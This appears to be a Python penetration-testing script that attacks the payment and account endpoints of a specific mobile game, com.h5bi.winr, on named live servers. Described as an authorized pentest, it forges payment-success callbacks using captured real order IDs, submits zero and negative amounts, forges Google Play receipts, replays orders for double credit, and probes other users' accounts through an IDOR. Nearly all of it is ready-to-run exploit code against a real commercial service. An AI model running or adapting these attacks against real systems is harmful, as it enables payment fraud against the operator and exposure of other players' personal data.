"""
CRITICAL: Payment Endpoint Bypass Tests — com.h5bi.winr v1.0.1
Endpoints: /v1/payment/paySuccess, /v1/auth/createOrder

SCOPE: Authorized pentest only. Tests for:
  1. Payment callback forgery (/v1/payment/paySuccess without real payment)
  2. Order ID replay attacks
  3. Parameter tampering (amount, currency, product)
  4. Google Play receipt forgery (/v1/user/postGooglePlayVerify)
  5. Missing server-side validation

Smali-confirmed /v1/payment/paySuccess params (com.qk.a.a.c.b$5.run()):
  uid, username, orderAmount, cpOrderNo, goodsID, goodsName, currency,
  gameRoleId, gameRoleName, gameRoleLevel, gameRoleServerId, gameRoleServerName
  + sign params added by b.a(HashMap): uid, username, token, sign, os, usermode, appKey

PREREQUISITE: Fill CAPTURED_SESSION from Frida/Burp output.

Usage: python3 02_payment_bypass.py
"""

import json
import time
import uuid
import urllib3
import requests
from sign_helper import (QuickGameSession, SESSION, SERVERS, SIGN_KEY_PAYMENT, md5,
                         SERVER_LOGIN, SERVER_PAY, SERVER_LOGIN_ALT, SERVER_PAY_ALT,
                         SERVER_LOGIN_IP, SERVER_PAY_IP, CAPTURED_ORDERS)

urllib3.disable_warnings()


# ── Live-captured session (Frida 2025-06-09) ─────────────────────────────────
# 5 real order IDs from captured payment flow (initiated, NOT paid):
CAPTURED_SESSION = SESSION
CAPTURED_ORDER_ID = CAPTURED_ORDERS[0]   # 6923ddd954df8e361c1cd57dd1e14fa7 (No.8GemPackx1)

# Server priority: IP-direct (confirmed reachable) → ALT → PRIMARY
AUTH_SERVER  = SERVER_LOGIN_IP   # https://47.89.242.44:510 (SNI=login.popoh5.com)
PAY_SERVER   = SERVER_PAY_IP     # https://47.89.242.44:520 (SNI=pay.popoh5.com)
AUTH_ALT     = SERVER_LOGIN_ALT  # https://en.sjmobilegame.com:10410
PAY_ALT      = SERVER_PAY_ALT    # https://en.sjmobilegame.com:10420
AUTH_PRIMARY = SERVER_LOGIN      # https://login.popoh5.com:510
PAY_PRIMARY  = SERVER_PAY        # https://pay.popoh5.com:520


def log(label: str, resp: requests.Response):
    print(f"\n{'='*55}")
    print(f"  TEST: {label}")
    print(f"  URL:  {resp.url}")
    print(f"  Status: {resp.status_code}")
    try:
        data = resp.json()
        print(f"  JSON: {json.dumps(data, indent=2)[:500]}")
    except Exception:
        print(f"  Body: {resp.text[:400]}")


def safe_post(endpoint: str, data: dict = None, pay_sign: bool = False,
              servers=None) -> None:
    """Try endpoint on multiple servers, print result or timeout for each."""
    # Default order: IP-direct first (confirmed reachable), then alt, then primary hostname
    target_servers = servers or [
        ("ip_pay",    PAY_SERVER),
        ("ip_login",  AUTH_SERVER),
        ("alt_login", AUTH_ALT),
        ("alt_pay",   PAY_ALT),
        ("primary_login", AUTH_PRIMARY),
        ("primary_pay",   PAY_PRIMARY),
    ]
    for name, srv in target_servers:
        label = f"{name or 'default'} {srv}"
        try:
            resp = CAPTURED_SESSION.post(endpoint, data=data, server=srv,
                                         pay_sign=pay_sign)
            log(f"{endpoint} [{name}]", resp)
            return  # stop at first response
        except requests.exceptions.ConnectTimeout:
            print(f"\n  [TIMEOUT] {label}{endpoint}")
        except requests.exceptions.ConnectionError as e:
            print(f"\n  [CONN ERR] {label}{endpoint}: {e}")


# ─── Test 1: Direct paySuccess call with crafted order ────────────────────────
def test_paysuccess_forgery():
    """
    Attempt to notify the server of a successful payment without completing one.
    The server should validate the payment against the payment provider,
    but if it trusts the client — this grants in-game currency.
    """
    fake_order_id = f"PENTEST_{int(time.time())}_{uuid.uuid4().hex[:8].upper()}"

    # Typical paySuccess params inferred from QuickGame SDK source
    payloads = [
        # Payload 1: Minimal — just order ID
        {
            "orderId":     fake_order_id,
            "payType":     "google",
            "productId":   "com.h5bi.winr.crystal_01",
            "productName": "Crystal Pack",
            "amount":      "0.99",
            "currencyType": "USD",
            "extra":       "{}",
        },
        # Payload 2: With receipt token (empty / malformed)
        {
            "orderId":      fake_order_id + "_2",
            "payType":      "google",
            "purchaseToken": "FORGED_TOKEN_" + uuid.uuid4().hex,
            "productId":    "com.h5bi.winr.crystal_01",
            "amount":       "0.99",
            "receipt":      "{}",
        },
        # Payload 3: amount=0 (zero-value order)
        {
            "orderId":     fake_order_id + "_3",
            "payType":     "google",
            "productId":   "com.h5bi.winr.vip_pack",
            "amount":      "0.00",
            "currencyType": "USD",
        },
    ]

    for i, payload in enumerate(payloads):
        # paySuccess lives on the payment server, try all if needed
        safe_post("/v1/payment/paySuccess", data=payload,
                  servers=[("ip_pay", PAY_SERVER), ("ip_login", AUTH_SERVER), ("alt_login", AUTH_ALT), ("alt_pay", PAY_ALT)])


# ─── Test 1b: paySuccess with EXACT smali-confirmed params ───────────────────
def test_paysuccess_exact_params():
    """
    CRITICAL PoC — use REAL cpOrderNos from Frida-captured payment flow.
    5 real order IDs captured. If server doesn't validate against payment provider → free items.

    Frida captured orders:
      6923ddd954df8e361c1cd57dd1e14fa7 — No.8GemPackx1   ($86.95)
      ed3605affcf7d38c71024b2472f3c366 — SingleSSHeroes   ($8.69)
      e2e96a710124b6d6b8d36d41ef2da51d — 588NewServer     ($39.13)
      984ac993a48ae52c4d3a2f483507278d — 388NewServer     ($26.08)
      3435c6decfce7842903785aba6004055 — 388NewServer     ($26.08)
    """
    from sign_helper import CAPTURED_ORDERS as ALL_ORDERS

    goods_map = {
        ALL_ORDERS[0]: ("com.h5bi.winr.gem_08", "No.8GemPackx1",    "8695"),
        ALL_ORDERS[1]: ("com.h5bi.winr.ssh_01",  "SingleSSHeroes",   "869"),
        ALL_ORDERS[2]: ("com.h5bi.winr.srv_588",  "588NewServer",    "3913"),
        ALL_ORDERS[3]: ("com.h5bi.winr.srv_388",  "388NewServer",    "2608"),
        ALL_ORDERS[4]: ("com.h5bi.winr.srv_388",  "388NewServer",    "2608"),
    }

    for cpOrderNo in ALL_ORDERS:
        gid, gname, amount = goods_map[cpOrderNo]
        payload = {
            "orderAmount":        amount,
            "cpOrderNo":          cpOrderNo,
            "goodsID":            gid,
            "goodsName":          gname,
            "currency":           "USD",
            "gameRoleId":         "1",
            "gameRoleName":       "TestHero",
            "gameRoleLevel":      "1",
            "gameRoleServerId":   "1",
            "gameRoleServerName": "Server1",
        }
        print(f"\n  → Testing real order: {cpOrderNo} ({gname})")
        safe_post("/v1/payment/paySuccess", data=payload, pay_sign=True)

    # Also try with a fresh fake order — tests if ANY forged order is accepted
    fake_payload = {
        "orderAmount": "0.99", "cpOrderNo": f"PENTEST_{int(time.time())}",
        "goodsID": "com.h5bi.winr.crystal_01", "goodsName": "CrystalPack",
        "currency": "USD", "gameRoleId": "1", "gameRoleName": "TestHero",
        "gameRoleLevel": "1", "gameRoleServerId": "1", "gameRoleServerName": "Server1",
    }
    print("\n  → Testing FAKE order (critical: should be rejected)")
    safe_post("/v1/payment/paySuccess", data=fake_payload, pay_sign=True)


# ─── Test 2: createOrder parameter tampering ──────────────────────────────────
def test_create_order_tamper():
    """
    Create order with manipulated amount — test if server validates server-side.
    """
    test_cases = [
        {"productId": "com.h5bi.winr.crystal_01", "amount": "0.01",   "currencyType": "USD"},
        {"productId": "com.h5bi.winr.crystal_big", "amount": "-1.00", "currencyType": "USD"},
        {"productId": "com.h5bi.winr.crystal_01",  "amount": "0.00",  "currencyType": "USD"},
        {"productId": "com.h5bi.winr.vip_999",     "amount": "0.99",  "currencyType": "USD"},
    ]

    for i, data in enumerate(test_cases):
        safe_post("/v1/auth/createOrder", data=data,
                  servers=[("ip_login", AUTH_SERVER), ("ip_pay", PAY_SERVER), ("alt_login", AUTH_ALT), ("alt_pay", PAY_ALT)])


# ─── Test 3: Google Play receipt forgery ─────────────────────────────────────
def test_google_play_receipt_forge():
    """
    Submit a forged Google Play receipt — if server doesn't call Google's API to verify,
    it may credit the account.
    """
    import base64, os as _os
    fake_receipt = {
        "packageName":   "com.h5bi.winr",
        "productId":     "com.h5bi.winr.crystal_01",
        "purchaseTime":  int(time.time() * 1000),
        "purchaseState": 0,
        "purchaseToken": "forged_" + uuid.uuid4().hex * 2,
        "orderId":       f"GPA.3300-1234-5678-{uuid.uuid4().hex[:5].upper()}",
        "autoRenewing":  False,
        "acknowledged":  False,
    }
    fake_sig = base64.b64encode(_os.urandom(256)).decode()

    payloads = [
        {"receipt": json.dumps(fake_receipt), "productId": "com.h5bi.winr.crystal_01",
         "orderId": fake_receipt["orderId"]},
        {"receipt": json.dumps(fake_receipt), "signature": fake_sig,
         "productId": "com.h5bi.winr.crystal_01", "orderId": fake_receipt["orderId"]},
        {"purchaseToken": fake_receipt["purchaseToken"],
         "productId": "com.h5bi.winr.crystal_01", "packageName": "com.h5bi.winr"},
    ]

    for i, payload in enumerate(payloads):
        safe_post("/v1/user/postGooglePlayVerify", data=payload,
                  servers=[("ip_login", AUTH_SERVER), ("ip_pay", PAY_SERVER), ("alt_login", AUTH_ALT), ("alt_pay", PAY_ALT)])


# ─── Test 4: Order replay attack ──────────────────────────────────────────────
def test_order_replay(real_order_id: str = None):
    """
    Replay a real orderId to get credited twice (idempotency check).
    """
    if not real_order_id:
        print("\n[SKIP] Order replay — no real_order_id")
        return

    payload = {
        "orderId":      real_order_id,
        "payType":      "google",
        "productId":    "com.h5bi.winr.crystal_01",
        "amount":       "0.99",
        "currencyType": "USD",
    }

    for attempt in range(3):
        safe_post("/v1/payment/paySuccess", data=payload,
                  servers=[("ip_pay", PAY_SERVER), ("ip_login", AUTH_SERVER), ("alt_login", AUTH_ALT), ("alt_pay", PAY_ALT)])
        time.sleep(1)


# ─── Test 5: getUserInfo IDOR ─────────────────────────────────────────────────
def test_idor_getuserinfo():
    """
    IDOR: authenticated as uid=A, request uid=B — if it returns B's data, confirmed.
    """
    own_uid = int(CAPTURED_SESSION.uid)
    test_uids = [str(own_uid + i) for i in range(-3, 4) if i != 0]

    print("\n" + "="*55)
    print("  TEST: IDOR — getUserInfo with other UIDs")

    for target_uid in test_uids:
        try:
            resp = CAPTURED_SESSION.get("/v1/auth/getUserInfo",
                                        extra_params={"uid": target_uid},
                                        server=AUTH_SERVER)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get("code") == 0:
                        print(f"  [IDOR ✓] uid={target_uid} => {json.dumps(data)[:200]}")
                    else:
                        print(f"  [OK 200] uid={target_uid} code={data.get('code')} msg={data.get('msg')}")
                except Exception:
                    print(f"  [200] uid={target_uid} => {resp.text[:100]}")
            else:
                print(f"  [{resp.status_code}] uid={target_uid}")
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError) as e:
            print(f"  [TIMEOUT/ERR] uid={target_uid}: {e}")


if __name__ == "__main__":
    print("[*] Payment Bypass Tests — com.h5bi.winr v1.0.1")
    print(f"    uid:       {CAPTURED_SESSION.uid}")
    print(f"    username:  {CAPTURED_SESSION.username}")
    print(f"    authToken: {CAPTURED_SESSION.authToken}")
    print(f"    server:    {CAPTURED_SESSION.server}")
    print(f"    cpOrderNo: {CAPTURED_ORDER_ID}\n")

    print("[*] TEST 1: paySuccess forgery (generic)")
    test_paysuccess_forgery()

    print("\n[*] TEST 1b: paySuccess REAL cpOrderNo (CRITICAL PoC)")
    test_paysuccess_exact_params()

    print("\n[*] TEST 2: createOrder parameter tampering")
    test_create_order_tamper()

    print("\n[*] TEST 3: Google Play receipt forgery")
    test_google_play_receipt_forge()

    print("\n[*] TEST 4: Order replay — ALL 5 captured real orders")
    from sign_helper import CAPTURED_ORDERS as ALL_ORDERS
    for oid in ALL_ORDERS:
        print(f"\n  → Replaying order: {oid}")
        test_order_replay(oid)

    print("\n[*] TEST 5: IDOR getUserInfo")
    test_idor_getuserinfo()

    print("\n[*] Payment tests complete.")
